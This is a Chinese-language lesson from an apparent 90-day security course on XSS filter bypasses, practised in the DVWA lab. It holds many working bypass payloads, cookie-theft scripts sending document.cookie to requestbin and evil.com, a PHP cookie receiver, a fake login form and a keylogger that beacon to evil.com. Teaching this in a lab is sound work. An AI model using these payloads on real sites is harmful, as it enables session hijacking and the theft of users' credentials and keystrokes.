---
title: Day024：XSS 跨站脚本 - 高级利用与绕过
tags:
  - 网络安全
  - XSS
  - 绕过技巧
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d024
date: 2026-02-15
updated: 2026-01-28
---

# Day024：XSS 跨站脚本 - 高级利用与绕过

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 筑基（第一阶段） |
| **所属周次** | Week 4：XSS 与文件上传 |
| **今日主题** | XSS 绕过技巧与高级利用 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你在测试一个网站，输入 `<script>alert(1)</script>`，但页面显示的是 `alert(1)`——`<script>` 标签被过滤掉了！
>
> **问题**：网站有防护怎么办？还能绕过吗？
>
> **今天的任务**：学习绑过 XSS 过滤的各种技巧，以及如何真正利用 XSS 窃取 Cookie。

---

## 今日目标

- [ ] 掌握至少 3 种绕过过滤的技巧
- [ ] 成功绕过 DVWA Medium 级别的过滤
- [ ] 理解如何将 Cookie 发送到远程服务器
- [ ] 了解 XSS 平台的使用

**闯关条件**：绕过 DVWA Medium 级别 XSS 过滤并成功弹窗。

---

## 实战任务（先动手！）

### 任务 1：分析过滤机制（20 分钟）

**环境**：DVWA - XSS (Reflected) - Medium

**操作步骤**：
1. 设置 Security Level 为 Medium
2. 输入 `<script>alert(1)</script>`
3. 查看页面源码，观察输入变成了什么

**分析**：
```
原始输入：<script>alert(1)</script>
页面显示：________________
被过滤/替换的内容：________________
```

**思考**：过滤是完全删除？还是替换成空？是区分大小写吗？

---

### 任务 2：绕过过滤（30 分钟）

**尝试以下 payload**：

1. **大小写绕过**
```html
<ScRiPt>alert(1)</ScRiPt>
```

2. **双写绕过**
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

3. **其他标签**
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
```

**记录哪些成功了**：
```
大小写：________________
双写：________________
img 标签：________________
svg 标签：________________
```

---

### 任务 3：Cookie 窃取模拟（30 分钟）

**目标**：把 Cookie 发送到"黑客服务器"

**方法 1：使用 RequestBin**

1. 访问 https://requestbin.com 创建一个接收地址
2. 构造 payload：
```html
<script>
new Image().src="https://xxx.requestbin.com/r/xxx?cookie="+document.cookie;
</script>
```
3. 在 DVWA 执行这个 payload
4. 查看 RequestBin 是否收到了 Cookie

**方法 2：简单 PHP 接收**

如果你有 VPS，可以创建 `cookie.php`：
```php
<?php
file_put_contents('log.txt', $_GET['c'] . "\n", FILE_APPEND);
?>
```

然后 payload：
```html
<script>
document.location='http://your-server/cookie.php?c='+document.cookie;
</script>
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 分析出过滤机制 | 15 分 |
| 至少一种绕过成功 | 25 分 |
| 理解 Cookie 窃取原理 | 20 分 |
| 成功将数据发送到外部 | 25 分 |
| 掌握 3 种以上绕过技巧 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 常见过滤方式

| 过滤方式 | 示例 | 绕过思路 |
|----------|------|----------|
| 删除 `<script>` | `<script>` → 空 | 用其他标签 |
| 替换为空 | `<script>` → ` ` | 双写 `<scr<script>ipt>` |
| 大小写过滤 | 只过滤小写 | 大小写混用 |
| 关键字黑名单 | `alert` 被过滤 | 用 `confirm` 或编码 |
| HTML 实体编码 | `<` → `&lt;` | 这个真的难绕，说明防御做得好 |

### 绕过技巧大全

**1. 大小写混淆**
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x onerror=alert(1)>
```

**2. 双写绕过**
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- 过滤后变成：<script>alert(1)</script> -->
```

**3. 替代标签**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
```

**4. 编码绕过**
```html
<!-- URL 编码 -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Unicode 编码 -->
<script>\u0061lert(1)</script>

<!-- HTML 实体编码 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

**5. 换行/空格绕过**
```html
<img src=x
onerror=alert(1)>

<script
>alert(1)</script>
```

### 真实攻击场景

**场景 1：盗取登录凭证**
```javascript
// 构造虚假登录框
document.body.innerHTML = `
<h2>会话已过期，请重新登录</h2>
<form action="http://evil.com/steal.php">
  用户名：<input name="user"><br>
  密码：<input name="pass" type="password"><br>
  <button>登录</button>
</form>`;
```

**场景 2：键盘记录**
```javascript
document.onkeypress = function(e) {
  new Image().src = "http://evil.com/log?key=" + e.key;
}
```

**场景 3：XSS 蠕虫**
```javascript
// 自动发送带 XSS 的消息给所有好友
// 好友查看后又自动传播
// 指数级扩散
```

### XSS 平台

专业的 XSS 测试平台可以：
- 自动接收窃取的数据
- 提供各种现成的 payload
- 记录受害者信息

常见平台：
- XSS Hunter
- BlueLotus XSS Platform
- BeEF（浏览器利用框架）

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| Cookie 发不出去 | 请求被阻止 | 检查 CSP 策略 |
| HttpOnly 限制 | JS 读不到 Cookie | Cookie 设了 HttpOnly |
| 编码多次 | payload 乱码 | 注意编码层数 |

---

## 知识卡片速查

### 绕过 Payload 速查

```html
<!-- 基础变形 -->
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- 事件触发 -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>

<!-- 无引号 -->
<img src=x onerror=alert(1)>

<!-- 编码 -->
<img src=x onerror=&#97;lert(1)>
```

### Cookie 窃取模板

```html
<!-- 基础 -->
<script>new Image().src="http://evil.com/c?"+document.cookie</script>

<!-- 更隐蔽 -->
<img src=x onerror="fetch('http://evil.com/c?'+document.cookie)">
```

---

## 常见问题

**Q1：HttpOnly Cookie 怎么办？**

A1：HttpOnly 的 Cookie 无法通过 JavaScript 读取，这是一个有效的防护。遇到这种情况：
1. 放弃窃取 Cookie
2. 改用其他攻击方式（钓鱼、键盘记录）
3. 尝试绕过（但很难）

**Q2：CSP 限制怎么绕？**

A2：Content Security Policy 可以限制脚本来源。如果配置严格，XSS 利用会很困难。需要找 CSP 配置的漏洞。

**Q3：payload 中的引号被过滤怎么办？**

A3：
1. 不用引号：`<img src=x onerror=alert(1)>`
2. 反引号：`<img src=x onerror=alert`1`>`
3. 编码：使用 HTML 实体编码

---

## 明日预告

**Day 025：文件上传漏洞 - 原理与基础利用**

明天你将：
- 学习文件上传漏洞的原理
- 上传第一个 Webshell
- 理解 GetShell 的概念

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功的绕过方式 | |
| Cookie 窃取成功 | 是/否 |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你学了"打不过就绕"的思想。
>
> 网站有过滤？大小写试试。标签被删？换个标签。关键字禁了？编码一下。
>
> 这就是安全对抗的本质——**攻防博弈**。
>
> 但别得意太早。真正做得好的网站，会用 HTML 实体编码输出所有用户输入，那时候你怎么绕都没用。
>
> 记住：**绕过技巧越多，说明防御做得越差**。好的防御，让你无处可绕。

```bash
echo "Day 024 Complete! 绕过技巧 GET！"
```
